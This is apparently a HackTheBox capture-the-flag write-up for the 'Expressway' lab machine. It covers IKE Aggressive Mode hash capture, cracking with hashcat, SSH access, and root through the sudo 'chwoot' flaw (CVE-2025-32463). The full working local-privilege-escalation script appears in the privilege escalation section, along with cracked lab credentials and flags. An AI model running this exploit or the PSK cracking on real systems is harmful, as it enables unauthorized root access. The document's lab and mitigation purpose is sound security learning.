# Expressway - HackTheBox Writeup

**Date:** 26.03.2026  
**OS:** Linux  
**IP Address:** 10.129.238.52  
**Difficulty:** Easy  
**Points:** 0  

---

# 1. Executive Summary

The exploitation of the **Expressway** machine followed a structured attack path. Reconnaissance revealed an IKE service which was vulnerable to Aggressive Mode information leakage. By capturing a Pre-Shared Key (PSK) hash, I was able to crack it offline and gain initial access via SSH.

Privilege escalation was achieved by exploiting a custom `sudo` binary (`/usr/local/bin/sudo`) vulnerable to **CVE-2025-32463** (chwoot). This allowed for a successful escape to root.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scans
Initial scanning focused on both TCP and UDP services to identify the full attack surface.

### TCP Port Scan
```bash
nmap -sC -sV -oN nmap/initial_scan.txt 10.129.238.52
```

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 22/tcp | open | ssh | OpenSSH 10.0p2 Debian 8 |

### UDP Port Scan
```bash
nmap -sU -Pn -oA nmap/udp_initial.txt 10.129.238.52
```

| Port | State | Service | Notes |
| :--- | :--- | :--- | :--- |
| 68/udp | open\|filtered | dhcpc | - |
| 69/udp | open\|filtered | tftp | - |
| 500/udp | open | isakmp | IKE VPN Service |
| 4500/udp | open\|filtered | nat-t-ike | - |

## 2.2. VPN Enumeration (IKE Scan)

The presence of port 500/udp (ISAKMP) suggested a VPN service. I used `ike-scan` to dive deeper.

### IKE Aggressive Mode Vulnerability
**Handshake Analysis:** IKEv1 has two main modes of handshake: Main Mode and Aggressive Mode. 
- **Main Mode**: Authenticates the initiator and responder privately via multiple packets.
- **Aggressive Mode**: Consolidates the handshake into three packets. Crucially, the **Pre-Shared Key (PSK) hash** is sent in the second packet (responder to initiator) *before* the initiator is authenticated. This means any unauthenticated attacker can request an aggressive mode handshake and receive a hash that can be cracked offline.

```bash
sudo ike-scan 10.129.238.52 -A -P
```

**Terminal Output:**
```text
10.129.238.52   Aggressive Mode Handshake returned HDR=(CKY-R=5df5c2565c3deb63) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
53e5b8dc...:c31442a3...:07bc0cc3...:724881cb...:00000001...:03000000...:08e1f2a5...:49266965...:1dc53cae...
```

---

# 3. Cryptanalysis & Initial Access

## 3.1. Cracking the IKE PSK
Using `hashcat` with Mode 5400 (IKE-PSK SHA1), I performed an offline brute-force attack on the captured parameters.

```bash
hashcat -m 5400 loot/expresswayhash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked Password:** `freakingrockstarontheroad`

## 3.2. SSH Access (User Flag)
The IKE scan revealed the ID `ike@expressway.htb`, which pointed to the existence of a user named `ike`. I connected via SSH using the cracked password.

```bash
ssh ike@10.129.238.52
```

**User Flag:**
```bash
ike@expressway:~$ cat user.txt
b82c01340f7fda04a989c172633bcc6d
```

---

# 4. Privilege Escalation (Root Flag)

## 4.1. Local Enumeration
A search for SUID binaries and custom installations led to a discovery in `/usr/local/bin`.

```bash
ike@expressway:~$ ls -l /usr/local/bin/sudo
-rwsr-xr-x 1 root root 1047552 Aug 29  2025 /usr/local/bin/sudo
```
The presence of a custom `sudo` binary version 1.9.17 in `/usr/local/bin` (instead of the standard `/usr/bin/sudo`) was highly suspicious.

## 4.2. Exploiting CVE-2025-32463 (Sudo "chwoot")
**Vulnerability Context:** CVE-2025-32463 is a directory traversal and `chroot` escape vulnerability in Sudo versions <= 1.9.17. It occurs when Sudo is configured to run a command in a specific root directory (via the `chroot` functionality) but fails to properly validate the path or sanitize the environment. This allow an attacker to bypass security checks by providing a malformed path that escapes the intended root and executes a shell as root.

**Exploitation:**
I created the exploit script `run.sh` in `/dev/shm`. This script, authored by Rich Mirch, automates the exploitation of the "chwoot" vulnerability.

```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD="/bin/bash"
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD="$@"
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

### Technical Breakdown of the Exploit:
1.  **Shared Library Injection**: The script creates a C file (`woot1337.c`) with a `__attribute__((constructor))` function. This function runs automatically as soon as the library is loaded. It sets the user/group IDs to 0 (root) and executes a shell command.
2.  **NSS Manipulation**: It sets up a fake root directory structure (`woot/etc`) and creates an `nsswitch.conf` file. By pointing the `passwd` database to its malicious library, it tricks `sudo` into loading the attacker-controlled code.
3.  **Sudo Integration**: The command `sudo -R woot woot` uses the `-R` (chroot) flag which is the core of the vulnerability. Because of the `chroot` implementation flaw in Sudo 1.9.17, the custom SUID binary at `/usr/local/bin/sudo` incorrectly handles the directory resolution, leading to the loading of the malicious `libnss_woot1337.so.2` from the relative `libnss_` directory, ultimately executing the constructor as root.

```bash
ike@expressway:/dev/shm$ bash run.sh 
woot!
root@expressway:/# whoami  
root
```

---

# 5. Credentials & Loot

| Identifier | Value | Source |
| :--- | :--- | :--- |
| User | ike | IKE ID |
| Password | freakingrockstarontheroad | Hashcat Cracking |
| SSH Key | Found in .ssh | User Enumeration |

**Flags:**
*   **User Flag:** `b82c01340f7fda04a989c172633bcc6d`
*   **Root Flag:** `4bd22d55f4cdd7c30896fbd3456b4377`

---

# 6. Recommendations & Mitigation

1.  **Disable IKE Aggressive Mode**: This mode is inherently insecure as it transmits the PSK hash pre-authentication. Switching to Main Mode provides DH-based protection for authentication data.
2.  **Internal Binary Auditing**: The presence of an outdated and vulnerable custom `sudo` binary in `/usr/local/bin` was the primary root escalation vector. Standardize and monitor SUID binaries.
3.  **Regular Patching**: Ensure `sudo` is updated to version 1.9.18 or later to mitigate the "chwoot" vulnerability.
